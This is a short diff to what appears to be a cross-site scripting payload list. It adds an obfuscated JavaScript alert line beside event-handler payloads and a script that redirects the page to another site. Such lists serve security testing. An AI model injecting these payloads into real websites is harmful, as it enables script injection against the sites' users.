@@ -85,6 +85,7 @@ srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=
 onload=alert(1)>
 onloadend=alert(1)>
 onloadstart=alert(1)>
+((_)=>m=>_[m]||(alert(m),_[m]=1))({})``
 
 <script>
             window.location = "http://youtube.com";
